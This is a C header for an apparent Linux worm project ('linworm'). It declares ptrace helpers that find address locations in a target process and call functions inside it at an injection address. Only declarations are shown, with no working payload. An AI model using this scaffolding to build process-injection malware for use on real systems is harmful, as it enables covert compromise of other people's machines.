#ifndef HELPERS_COMMON_H
#define HELPERS_COMMON_H

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fstab.h>
#include <dlfcn.h>
#include <link.h>
#include <sys/stat.h> 
#include <sys/utsname.h>

#include "../linworm.h"
#include "../logging/logger.h"
#include "ptrace.h"

#define SAFE_FREE(ptr) do { \
    if ((ptr) != NULL) {    \
        free(ptr);          \
        (ptr) = NULL;       \
    }                       \
} while (0)

#define PATH_MAX 4096

long get_target_exec_addr(pid_t target_pid);
long get_target_lib_addr(pid_t target_pid, char *libname);
long get_target_func_addr(pid_t target_pid, const char *func_name);
long call_target_func(pid_t target, long inject_addr, REG *regs,
                      const call_args_t *call);
void hexdump(const void *data, size_t size);

#endif